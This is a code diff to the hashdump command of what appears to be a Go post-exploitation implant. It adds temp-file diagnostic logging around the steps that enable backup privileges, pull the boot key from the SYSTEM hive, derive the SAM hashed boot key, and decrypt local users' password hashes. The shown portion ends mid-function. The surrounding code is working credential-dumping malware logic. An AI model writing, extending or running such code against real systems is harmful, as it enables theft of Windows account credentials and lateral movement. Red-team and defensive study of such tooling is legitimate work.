@@ -59,36 +59,62 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
+	// Write diagnostic log to file — survives process crash
+	diagFile, _ := os.CreateTemp("", "hashdump-diag-*.log")
+	diagLog := func(msg string) {
+		if diagFile != nil {
+			fmt.Fprintf(diagFile, "%s\n", msg)
+			diagFile.Sync()
+		}
+	}
+	defer func() {
+		if diagFile != nil {
+			diagFile.Close()
+		}
+	}()
+	diagLog("hashdump: starting")
+
 	// Enable SeBackupPrivilege on both process and thread tokens
 	// Thread token is needed when impersonating SYSTEM via getsystem
 	if err := enableBackupPrivilege(); err != nil {
-		// Non-fatal: process token privilege may not be adjustable
-		_ = err
+		diagLog(fmt.Sprintf("enableBackupPrivilege: %v (non-fatal)", err))
+	} else {
+		diagLog("enableBackupPrivilege: ok")
 	}
 	if err := enableThreadBackupPrivilege(); err != nil {
-		// Non-fatal: thread token may not exist (no impersonation)
-		_ = err
+		diagLog(fmt.Sprintf("enableThreadBackupPrivilege: %v (non-fatal)", err))
+	} else {
+		diagLog("enableThreadBackupPrivilege: ok")
 	}
 
 	// Step 1: Extract boot key from SYSTEM hive
+	diagLog("extractBootKey: starting")
 	bootKey, err := extractBootKey()
 	if err != nil {
+		diagLog(fmt.Sprintf("extractBootKey: FAILED: %v", err))
 		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
 	}
+	diagLog(fmt.Sprintf("extractBootKey: ok (len=%d)", len(bootKey)))
 	defer structs.ZeroBytes(bootKey)
 
 	// Step 2: Read SAM F value and derive hashed boot key
+	diagLog("deriveHashedBootKey: starting")
 	hashedBootKey, samRevision, err := deriveHashedBootKey(bootKey)
 	if err != nil {
+		diagLog(fmt.Sprintf("deriveHashedBootKey: FAILED: %v", err))
 		return errorf("Failed to derive hashed boot key: %v", err)
 	}
+	diagLog(fmt.Sprintf("deriveHashedBootKey: ok (rev=%d)", samRevision))
 	defer structs.ZeroBytes(hashedBootKey)
 
 	// Step 3: Enumerate user accounts and extract hashes
+	diagLog("enumerateAndDecryptUsers: starting")
 	users, err := enumerateAndDecryptUsers(hashedBootKey, samRevision)
 	if err != nil {
+		diagLog(fmt.Sprintf("enumerateAndDecryptUsers: FAILED: %v", err))
 		return errorf("Failed to enumerate users: %v", err)
 	}
+	diagLog(fmt.Sprintf("enumerateAndDecryptUsers: ok (count=%d)", len(users)))
 	defer func() {
 		for i := range users {
 			structs.ZeroString(&users[i].lmHash)
